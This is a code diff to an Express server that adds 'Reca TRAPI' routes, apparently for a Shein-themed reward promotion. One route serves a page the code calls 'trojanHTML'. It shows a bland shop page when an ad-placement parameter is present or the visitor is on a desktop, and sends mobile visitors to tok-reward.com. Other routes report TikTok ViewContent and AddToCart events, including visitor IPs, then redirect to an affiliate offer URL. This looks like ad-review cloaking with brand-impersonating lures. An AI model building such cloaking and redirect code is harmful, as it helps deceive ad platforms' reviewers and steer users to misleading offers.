@@ -25,6 +25,8 @@ const hashValue = (value) => {
     return crypto.createHash('sha256').update(value).digest('hex');
 };
 
+// TRAPI Beta (Shein)
+
     // Test Pixel Events
 app.get('/api/test/v1', async (req, res, next) => {
     const { s1, ttclid } = req.query;
@@ -222,6 +224,8 @@ app.get('/api/shein/v2/cvr', async (req, res) => {
 
 
 
+// Sephora API
+
     // Test SEPH API Pixel Events
 app.get('/api/sephora/test/v1', async (req, res, next) => {
     const { s1, ttclid } = req.query;
@@ -398,6 +402,166 @@ app.get('/api/sephora/v1/exit', async (req, res) => {
     }
 });
 
+
+
+
+
+// Reca TRAPI v2.1 (Shein)
+
+
+// Middleware to cloak Reca TRAPI Traffic
+app.get('/reca/:s1', (req, res, next) => {
+    const { s1 } = req.params;
+    const { ttclid } = req.query;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const ttclid = urlParams.get("ttclid");
+                const s1 = "${s1}";
+                const destination = \`https://tok-reward.com/api/reca/v2/entry?s1=\${s1}&ttclid=\${ttclid}\`;
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = destination;
+                    } else {
+                    }
+            </script>
+            <title>${s1}</title>
+        </head>
+        <body>
+            <h1>Welcome to ${s1} Shop!</h1>
+            <p>You are shopping at: ${s1}</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served TRAPI Trojan (${s1})`);
+});
+
+// Middleware to receive Reca TRAPI Traffic (ENTRY)
+app.get('/api/reca/v2/entry', async (req, res) => {
+    const { s1, ttclid } = req.query;
+    if (!s1 || !ttclid) {
+        return res.redirect(`https://tok-reward.com/recashein.html`);
+        console.log('TRAPI: UTM Error @ Entry (Reca/v2)')
+    }
+    const ipString = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const ip = extractSingleIP(ipString);
+    const user_agent = req.headers['user-agent'];
+    const event_time = Math.floor(Date.now() / 1000);
+    const external_id = hashValue(ttclid);
+
+    const payload = {
+        event_source: "web",
+        event_source_id: "PIXEL ID NEEDED",
+        data: [
+            {
+                event: "ViewContent",
+                event_time: event_time,
+                user: {
+                    ttclid: ttclid,
+                    external_id: external_id,
+                    ip: ip,
+                    user_agent: user_agent
+                },
+                properties: {
+                    content_type: "product",
+                    currency: "USD"
+                },
+                page: {
+                    url: "https://tok-reward.com"
+                }
+            }
+        ]
+    };
+    
+    try {
+        const response = await axios.post('https://business-api.tiktok.com/open_api/v1.3/event/track/', payload, {
+            headers: {
+                'Access-Token': 'ACCESS TOKEN NEEDED',
+                'Content-Type': 'application/json'
+            }
+        });
+
+        console.log(`LPV Posted (${s1})`);
+        res.redirect(`https://tok-reward.com/recashein.html?s1=${s1}&ttclid=${ttclid}`);
+    } catch (error) {
+        console.error('Error making entry POST request', error);
+        res.redirect(`https://tok-reward.com/recashein.html`);
+    }
+});
+
+
+// Middleware to receive Reca TRAPI Traffic (EXIT)
+app.get('/api/reca/v2/exit', async (req, res) => {
+    const { s1, ttclid } = req.query;
+    if (!s1 || !ttclid) {
+        return res.redirect('https://spnccrzone.com/?nc2u=N1TKAaFwAm26L%2b%2fv5DgCaeHmFZjWo2Y7vQJDRoz7h5U%3d&s1=trapierror');
+        console.log('TRAPI: UTM Error @ Exit (Reca/v2)')
+    }
+    const ipString = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const ip = extractSingleIP(ipString);
+    const user_agent = req.headers['user-agent'];
+    const event_time = Math.floor(Date.now() / 1000);
+    const external_id = hashValue(ttclid);
+
+   const payload = {
+        event_source: "web",
+        event_source_id: "PIXEL ID NEEDED",
+        data: [
+            {
+                event: "AddToCart",
+                event_time: event_time,
+                user: {
+                    ttclid: ttclid,
+                    external_id: external_id,
+                    ip: ip,
+                    user_agent: user_agent
+                },
+                properties: {
+                    content_type: "product",
+                    currency: "USD"
+                },
+                page: {
+                    url: "https://tok-reward.com"
+                }
+            }
+        ]
+    };
+
+    try {
+        const response = await axios.post('https://business-api.tiktok.com/open_api/v1.3/event/track/', payload, {
+            headers: {
+                'Access-Token': 'ACCESS TOKEN NEEDED',
+                'Content-Type': 'application/json'
+            }
+        });
+
+        console.log(`CTR Posted (${s1})`);
+        res.redirect(`https://spnccrzone.com/?nc2u=N1TKAaFwAm26L%2b%2fv5DgCaeHmFZjWo2Y7vQJDRoz7h5U%3d&s1=${s1}&s5=${ttclid}`);
+    } catch (error) {
+        console.error('Error making exit POST request:', error);
+        res.redirect(`https://spnccrzone.com/?nc2u=N1TKAaFwAm26L%2b%2fv5DgCaeHmFZjWo2Y7vQJDRoz7h5U%3d&s1=trapierror`);
+    }
+});
+
+
+
+// Middleware to receive TRAPI Beta Traffic (FLUENT CVR)
+app.get('/api/shein/v2/cvr', async (req, res) => {
+    const { s1, s5, price, } = req.query;
+    const event_time = Math.floor(Date.now() / 1000);
+    res.status(200).send('OK');
+
+  //  CODE OUT CVR HANDLING HERE
+    
+});
 
 
 
